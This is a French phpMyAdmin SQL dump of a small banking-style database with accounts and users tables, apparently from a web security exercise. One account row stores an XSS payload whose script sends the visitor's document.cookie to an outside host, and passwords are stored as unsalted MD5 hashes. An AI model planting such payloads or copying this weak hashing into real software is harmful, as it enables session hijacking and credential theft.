-- phpMyAdmin SQL Dump
-- version 4.7.3
-- https://www.phpmyadmin.net/
--
-- Hôte : artgalermoeibltd.mysql.db
-- Généré le :  Dim 17 sep. 2017 à 20:07
-- Version du serveur :  5.6.34-log
-- Version de PHP :  5.6.31

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de données :  `artgalermoeibltd`
--

-- --------------------------------------------------------

--
-- Structure de la table `accounts`
--

CREATE TABLE `accounts` (
  `id` int(11) NOT NULL,
  `type` varchar(250) NOT NULL,
  `amount` int(11) NOT NULL,
  `iduser` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Déchargement des données de la table `accounts`
--

INSERT INTO `accounts` (`id`, `type`, `amount`, `iduser`) VALUES
(1, 'Livret bleu', 1100, 1),
(2, 'Compte Courant', 1600, 1),
(4, 'Hacked! <script>window.open(\"http://uha.artgalerielataniere.fr/xssattack/xss.php?c=\"+document.cookie);</script>', 5000, 2),
(5, 'Compte Epargne', 1520, 2),
(6, 'Livret jeune', 3, 3),
(7, 'Test', 0, 9),
(8, 'Livret vert', 550, 1),
(9, 'Livret bleu', 5000, 2);

-- --------------------------------------------------------

--
-- Structure de la table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `login` varchar(10) NOT NULL,
  `pass` varchar(50) NOT NULL,
  `img` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Déchargement des données de la table `users`
--

INSERT INTO `users` (`id`, `login`, `pass`, `img`) VALUES
(1, 'mickael', 'd872b541af4d8db93797ec0e5acf3589', './insert/uploads/mask'),
(2, 'bob', '23eee8e941181188cef6a1e39b129cc6', './insert/uploads/framboise.jpg'),
(3, 'bobi', 'e9859d896e8043b730322cac50c61211', './insert/uploads/link.png'),
(9, 'martin', '5f4dcc3b5aa765d61d8327deb882cf99', './insert/uploads/skull.png'),
(18, 'toto', '098f6bcd4621d373cade4e832627b4f6', ''),
(47, 'mtoiyo', 'c6c8f64a5d39a67bbb5a2f5d95014e04', '');

--
-- Index pour les tables déchargées
--

--
-- Index pour la table `accounts`
--
ALTER TABLE `accounts`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `login` (`login`);

--
-- AUTO_INCREMENT pour les tables déchargées
--

--
-- AUTO_INCREMENT pour la table `accounts`
--
ALTER TABLE `accounts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
--
-- AUTO_INCREMENT pour la table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=55;COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
